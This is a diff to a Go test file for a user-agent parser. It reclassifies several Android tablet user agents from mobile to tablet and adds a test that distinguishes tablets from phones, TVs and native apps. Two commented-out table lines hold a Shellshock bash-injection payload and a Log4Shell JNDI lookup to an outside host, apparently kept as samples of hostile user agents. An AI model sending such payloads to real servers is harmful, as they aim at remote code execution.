@@ -153,17 +153,17 @@ var testTable = [][]string{
 	{"SonyEricssonK310iv/R4DA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.1.13.0", "NetFront", "3.3", "mobile", ""},
 
 	// Device names
-	{"Mozilla/5.0 (Linux; Android 10; 8092) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36", "Chrome", "112.0.0.0", "mobile", ua.Android, "8092"},
+	{"Mozilla/5.0 (Linux; Android 10; 8092) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36", "Chrome", "112.0.0.0", "tablet", ua.Android, "8092"},
 	{"Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.54 Mobile DuckDuckGo/5 Safari/537.36", "Mobile DuckDuckGo", "5", "mobile", ua.Android, ""},
 	{"Mozilla/5.0 (Linux; Android 6.0; VIVAX TABLET TPC-101 3G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36", ua.Chrome, "106.0.0.0", "tablet", ua.Android, "VIVAX TABLET TPC-101 3G"},
-	{"Mozilla/5.0 (Linux; Android 8.1.0; 8068 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.116 Safari/537.36", ua.Chrome, "111.0.5563.116", "mobile", ua.Android, "8068"},
-	{"Mozilla/5.0 (Linux; Android 8.1.0; Lenovo TB-7104F Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.91 Safari/537.36", ua.Chrome, "107.0.5304.91", "mobile", ua.Android, "Lenovo TB-7104F"},
-	{"Mozilla/5.0 (Linux; Android 7.1.1; Lenovo TB-X304L Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36", ua.Chrome, "56.0.2924.87", "mobile", ua.Android, "Lenovo TB-X304L"},
-	{"Mozilla/5.0 (Linux; Android 4.4.4; SM-T560 Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Safari/537.36", ua.Chrome, "68.0.3440.91", "mobile", ua.Android, "SM-T560"},
-	{"Mozilla/5.0 (Linux; Android 5.1; B3-A20 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Safari/537.36", ua.Chrome, "50.0.2661.89", "mobile", ua.Android, "B3-A20"},
-	{"Mozilla/5.0 (Linux; Android 11; TPC_8074G Build/RP1A.200720.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.136 Safari/537.36", ua.Chrome, "105.0.5195.136", "mobile", ua.Android, "TPC_8074G"},
-	{"Mozilla/5.0 (Linux; Android 9; m5621 Build/PPR2.180905.006.A1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.158 Safari/537.36", ua.Chrome, "66.0.3359.158", "mobile", ua.Android, "m5621"},
-	{"Mozilla/5.0 (Linux; Android 10; meanIT_X20 Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.153 Safari/537.36", ua.Chrome, "110.0.5481.153", "mobile", ua.Android, "meanIT_X20"},
+	{"Mozilla/5.0 (Linux; Android 8.1.0; 8068 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.116 Safari/537.36", ua.Chrome, "111.0.5563.116", "tablet", ua.Android, "8068"},
+	{"Mozilla/5.0 (Linux; Android 8.1.0; Lenovo TB-7104F Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.91 Safari/537.36", ua.Chrome, "107.0.5304.91", "tablet", ua.Android, "Lenovo TB-7104F"},
+	{"Mozilla/5.0 (Linux; Android 7.1.1; Lenovo TB-X304L Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36", ua.Chrome, "56.0.2924.87", "tablet", ua.Android, "Lenovo TB-X304L"},
+	{"Mozilla/5.0 (Linux; Android 4.4.4; SM-T560 Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Safari/537.36", ua.Chrome, "68.0.3440.91", "tablet", ua.Android, "SM-T560"},
+	{"Mozilla/5.0 (Linux; Android 5.1; B3-A20 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Safari/537.36", ua.Chrome, "50.0.2661.89", "tablet", ua.Android, "B3-A20"},
+	{"Mozilla/5.0 (Linux; Android 11; TPC_8074G Build/RP1A.200720.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.136 Safari/537.36", ua.Chrome, "105.0.5195.136", "tablet", ua.Android, "TPC_8074G"},
+	{"Mozilla/5.0 (Linux; Android 9; m5621 Build/PPR2.180905.006.A1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.158 Safari/537.36", ua.Chrome, "66.0.3359.158", "tablet", ua.Android, "m5621"},
+	{"Mozilla/5.0 (Linux; Android 10; meanIT_X20 Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.153 Safari/537.36", ua.Chrome, "110.0.5481.153", "tablet", ua.Android, "meanIT_X20"},
 	{"Mozilla/5.0 (Linux; Android 10;)", "Mozilla/5.0 (Linux; Android 10;)", "", "mobile", ua.Android},
 	// {`() { ignored; }; echo Content-Type: text/plain ; echo ; echo "bash_cve_2014_6271_rce Output : $((70+91))"`, "", "mobile", ua.Android},
 	//{`${jndi:ldap://log4shell-generic-8ZnJfq2XFL3GWyaLyOpT${lower:ten}.w.nessus.org/nessus}`, "", "mobile", ua.Android},
@@ -311,4 +311,43 @@ func ExampleParse() {
 		}
 	}
 
+}
+
+func TestAndroidTabletWithoutTheWordTablet(t *testing.T) {
+	const webkit = "AppleWebKit/537.36 (KHTML, like Gecko)"
+	cases := []struct {
+		name, userAgent string
+		tablet          bool
+	}{
+		{"Chrome on a Galaxy Tab", "Mozilla/5.0 (Linux; Android 13; SM-X700) " + webkit + " Chrome/130.0.0.0 Safari/537.36", true},
+		{"Chrome tablet, reduced user agent", "Mozilla/5.0 (Linux; Android 10; K) " + webkit + " Chrome/130.0.0.0 Safari/537.36", true},
+		{"Samsung Internet on a Galaxy Tab", "Mozilla/5.0 (Linux; Android 12; SM-T500) " + webkit + " SamsungBrowser/22.0 Chrome/111.0.5563.116 Safari/537.36", true},
+		{"WebView on a Galaxy Tab", "Mozilla/5.0 (Linux; Android 13; SM-T220 Build/TP1A.220624.014; wv) " + webkit + " Version/4.0 Chrome/109.0.5414.117 Safari/537.36", true},
+		{"Firefox on a tablet", "Mozilla/5.0 (Android 13; Tablet; rv:130.0) Gecko/130.0 Firefox/130.0", true},
+
+		{"Chrome on a phone", "Mozilla/5.0 (Linux; Android 13; Pixel 7) " + webkit + " Chrome/130.0.0.0 Mobile Safari/537.36", false},
+		{"Chrome phone, reduced user agent", "Mozilla/5.0 (Linux; Android 10; K) " + webkit + " Chrome/130.0.0.0 Mobile Safari/537.36", false},
+		{"Samsung Internet on a phone", "Mozilla/5.0 (Linux; Android 13; SM-S918B) " + webkit + " SamsungBrowser/22.0 Chrome/111.0.5563.116 Mobile Safari/537.36", false},
+		{"WebView on a phone", "Mozilla/5.0 (Linux; Android 16; SM-S938B Build/BP2A.250605.031; wv) " + webkit + " Version/4.0 Chrome/131.0.0.0 Mobile Safari/537.36", false},
+		{"Firefox on a phone", "Mozilla/5.0 (Android 13; Mobile; rv:130.0) Gecko/130.0 Firefox/130.0", false},
+		{"native app, Dalvik", "Dalvik/2.1.0 (Linux; U; Android 13; SM-S918B Build/TP1A.220624.014)", false},
+		{"native app, survey SDK", "Pureprofile/3.0.16 com.pureprofile.sdk/2.0.76 (samsung SM-S938B; Android 16 - SDK: 36; native-app)", false},
+		{"DuckDuckGo on a phone", "Mozilla/5.0 (Linux; Android 10) " + webkit + " Version/4.0 Chrome/96.0.4664.54 Mobile DuckDuckGo/5 Safari/537.36", false},
+		{"truncated, no browser", "Mozilla/5.0 (Linux; Android 10;)", false},
+		{"Android TV", "Mozilla/5.0 (Linux; Android 9; BRAVIA 4K GB ATV3 Build/PPR1.180610.011) " + webkit + " Chrome/83.0.4103.101 Safari/537.36", false},
+	}
+	for _, c := range cases {
+		t.Run(c.name, func(t *testing.T) {
+			got := ua.Parse(c.userAgent)
+			if got.OS != ua.Android {
+				t.Fatalf("OS should be Android, not %q", got.OS)
+			}
+			if got.Tablet != c.tablet {
+				t.Errorf("Tablet should be %v, not %v", c.tablet, got.Tablet)
+			}
+			if got.Mobile == c.tablet {
+				t.Errorf("Mobile should be %v, not %v", !c.tablet, got.Mobile)
+			}
+		})
+	}
 }
